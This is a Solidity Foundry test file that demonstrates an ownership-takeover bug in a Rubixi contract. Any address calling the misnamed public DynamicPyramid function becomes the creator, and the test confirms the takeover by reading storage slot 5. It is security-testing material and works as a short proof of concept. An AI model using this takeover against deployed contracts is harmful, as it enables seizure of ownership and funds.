
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi rubixi;

    function setUp() public {
        rubixi = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // 1. Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // 2. Exclude the Zero Address
        vm.assume(caller != address(0));

        // 3. Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // The function DynamicPyramid is public and sets the creator. 
        // It was likely intended as a constructor but mismatches the contract name.
        rubixi.DynamicPyramid();
        
        // ASSERT SUCCESS
        // Verify that the caller has successfully taken ownership (creator role).
        // 'creator' is the 6th state variable (slot 5).
        bytes32 creatorSlot = vm.load(address(rubixi), bytes32(uint256(5)));
        address storedCreator = address(uint160(uint256(creatorSlot)));
        
        assertEq(storedCreator, caller, "Arbitrary caller should become the creator");
    }

    receive() external payable {}

    fallback() external payable {}
}
